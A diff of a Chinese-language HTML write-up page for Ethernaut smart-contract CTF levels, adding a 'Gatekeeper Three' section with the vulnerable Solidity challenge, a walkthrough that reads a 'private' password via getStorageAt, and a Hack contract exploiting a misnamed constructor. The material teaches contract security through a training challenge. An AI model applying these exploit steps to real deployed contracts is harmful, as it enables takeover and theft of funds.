@@ -2963,6 +2963,13 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#28-gatekeeper-three" class="md-nav__link">
+    28. Gatekeeper Three
+  </a>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -3568,6 +3575,13 @@
         
       </ul>
     </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#28-gatekeeper-three" class="md-nav__link">
+    28. Gatekeeper Three
+  </a>
   
 </li>
       
@@ -4468,7 +4482,7 @@
 <h3 id="_8">参考资料<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h3>
 <p><a href="https://solidity-by-example.org/hacks/accessing-private-data/">Accessing Private Data | Solidity by Example</a></p>
 <h2 id="13-gatekeeper-one">13. Gatekeeper One<a class="headerlink" href="#13-gatekeeper-one" title="Permanent link">&para;</a></h2>
-<p>越过守门人并注册为参赛者</p>
+<p>越过守门人并注册为新成员</p>
 <div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
 <span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>
 
@@ -5959,13 +5973,126 @@ f3  // return
 <ul>
 <li><a href="https://blog.soliditylang.org/2021/04/21/custom-errors/">Custom Errors in Solidity | Solidity Blog</a></li>
 </ul>
+<h2 id="28-gatekeeper-three">28. Gatekeeper Three<a class="headerlink" href="#28-gatekeeper-three" title="Permanent link">&para;</a></h2>
+<p>再次成为 <code>entrant</code> XD</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
+<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>
+
+<span class="nx">contract</span><span class="w"> </span><span class="nx">SimpleTrick</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="nx">GatekeeperThree</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">target</span><span class="p">;</span>
+<span class="w">  </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">trick</span><span class="p">;</span>
+<span class="w">  </span><span class="nx">uint</span><span class="w"> </span><span class="kr">private</span><span class="w"> </span><span class="nx">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">block</span><span class="p">.</span><span class="nx">timestamp</span><span class="p">;</span>
+
+<span class="w">  </span><span class="kr">constructor</span><span class="w"> </span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="nx">_target</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">target</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">GatekeeperThree</span><span class="p">(</span><span class="nx">_target</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span>
+
+<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">checkPassword</span><span class="p">(</span><span class="nx">uint</span><span class="w"> </span><span class="nx">_password</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">_password</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">password</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="nx">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">block</span><span class="p">.</span><span class="nx">timestamp</span><span class="p">;</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>
+<span class="w">  </span><span class="p">}</span>
+
+<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">trickInit</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">trick</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span>
+
+<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">trickyTrick</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nx">trick</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="nx">target</span><span class="p">.</span><span class="nx">getAllowance</span><span class="p">(</span><span class="nx">password</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
+
+<span class="nx">contract</span><span class="w"> </span><span class="nx">GatekeeperThree</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">owner</span><span class="p">;</span>
+<span class="w">  </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">entrant</span><span class="p">;</span>
+<span class="w">  </span><span class="nx">bool</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">allow_enterance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>
+<span class="w">  </span><span class="nx">SimpleTrick</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">trick</span><span class="p">;</span>
+
+<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">construct0r</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="nx">owner</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
+<span class="w">  </span><span class="p">}</span>
+
+<span class="w">  </span><span class="nx">modifier</span><span class="w"> </span><span class="nx">gateOne</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">owner</span><span class="p">);</span>
+<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">tx</span><span class="p">.</span><span class="nx">origin</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nx">owner</span><span class="p">);</span>
+<span class="w">    </span><span class="nx">_</span><span class="p">;</span>
+<span class="w">  </span><span class="p">}</span>
+
+<span class="w">  </span><span class="nx">modifier</span><span class="w"> </span><span class="nx">gateTwo</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">allow_enterance</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">true</span><span class="p">);</span>
+<span class="w">    </span><span class="nx">_</span><span class="p">;</span>
+<span class="w">  </span><span class="p">}</span>
+
+<span class="w">  </span><span class="nx">modifier</span><span class="w"> </span><span class="nx">gateThree</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">balance</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0.001</span><span class="w"> </span><span class="nx">ether</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">payable</span><span class="p">(</span><span class="nx">owner</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="mf">0.001</span><span class="w"> </span><span class="nx">ether</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">false</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="nx">_</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">  </span><span class="p">}</span>
+
+<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">getAllowance</span><span class="p">(</span><span class="nx">uint</span><span class="w"> </span><span class="nx">_password</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">trick</span><span class="p">.</span><span class="nx">checkPassword</span><span class="p">(</span><span class="nx">_password</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">allow_enterance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">  </span><span class="p">}</span>
+
+<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">createTrick</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">trick</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">SimpleTrick</span><span class="p">(</span><span class="nx">payable</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">)));</span>
+<span class="w">    </span><span class="nx">trick</span><span class="p">.</span><span class="nx">trickInit</span><span class="p">();</span>
+<span class="w">  </span><span class="p">}</span>
+
+<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">enter</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">gateOne</span><span class="w"> </span><span class="nx">gateTwo</span><span class="w"> </span><span class="nx">gateThree</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bool</span><span class="w"> </span><span class="nx">entered</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">entrant</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">tx</span><span class="p">.</span><span class="nx">origin</span><span class="p">;</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
+<span class="w">  </span><span class="p">}</span>
+
+<span class="w">  </span><span class="nx">receive</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{}</span>
+<span class="p">}</span>
+</code></pre></div>
+<ul>
+<li>
+<p>调用 <code>GatekeeperThree.createTrick()</code> 初始化 <code>trick</code></p>
+<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">createTrick</span><span class="p">();</span>
+</code></pre></div>
+</li>
+<li>
+<p><code>GatekeeperThree.construct0r()</code> 由于 typo 成为普通函数，可直接调用变更 <code>owner</code>，使用合约调用 <code>GatekeeperThree.enter()</code> 能够通过 <code>gateOne</code></p>
+</li>
+<li>
+<p><code>gateTwo</code> 需要通过 <code>GatekeeperThree.getAllowance()</code> 使 <code>allow_enterance = true</code>，由 <code>getStorageAt()</code> 获取 <code>SimpleTrick.password</code>，以通过 <code>trick.checkPassword()</code></p>
+<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;</span><span class="w"> </span><span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">getStorageAt</span><span class="p">(</span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">trick</span><span class="p">(),</span><span class="w"> </span><span class="mf">2</span><span class="p">);</span>
+<span class="s2">&quot;0x0000000000000000000000000000000000000000000000000000000064047a80&quot;</span><span class="w"> </span>
+</code></pre></div>
+</li>
+<li>
+<p>通过 <code>gateThree</code> 需要合约 <code>GatekeeperThree</code> 内的余额大于 0.001 ether，且无法向 <code>owner</code> 发送 0.001 ether（<code>owner</code> 不提供 <code>payable</code> 的 <code>receive</code> 或 <code>fallback</code> 函数）</p>
+</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="kr">interface</span><span class="w"> </span><span class="nx">IGatekeeperThree</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">construct0r</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="p">;</span>
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">getAllowance</span><span class="p">(</span><span class="nx">uint</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="p">;</span>
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">enter</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="nx">contract</span><span class="w"> </span><span class="nx">Hack</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">exploit</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="nx">instance</span><span class="p">,</span><span class="w"> </span><span class="nx">uint</span><span class="w"> </span><span class="nx">pass</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">instance</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="mf">0.001001</span><span class="w"> </span><span class="nx">ether</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">IGatekeeperThree</span><span class="p">(</span><span class="nx">instance</span><span class="p">).</span><span class="nx">getAllowance</span><span class="p">(</span><span class="nx">pass</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">IGatekeeperThree</span><span class="p">(</span><span class="nx">instance</span><span class="p">).</span><span class="nx">construct0r</span><span class="p">();</span>
+<span class="w">        </span><span class="nx">IGatekeeperThree</span><span class="p">(</span><span class="nx">instance</span><span class="p">).</span><span class="nx">enter</span><span class="p">();</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
 
   <hr>
 <div class="md-source-file">
   <small>
     
       最后更新:
-      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">2023年3月5日 11:03:13</span>
+      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">2023年3月5日 19:43:59</span>
       
     
   </small>
